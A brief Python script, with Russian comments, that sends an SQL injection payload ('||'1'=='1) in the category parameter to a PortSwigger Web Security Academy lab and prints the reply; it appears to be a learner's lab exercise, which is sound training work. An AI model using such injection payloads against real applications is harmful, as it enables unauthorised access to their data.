import requests

# Константы
URL = "https://0a2e008c041d4508803399b600370047.web-security-academy.net/filter"
HEADERS = {
    "Host": "0a2e008c041d4508803399b600370047.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
}

# Параметры
payload = "'||'1'=='1"
params = {"category": payload}

# Отправка запроса
response = requests.get(URL, headers=HEADERS, params=params)

# Вывод ответа
print("status code:", response.status_code)
print("response:")
print(response.text)
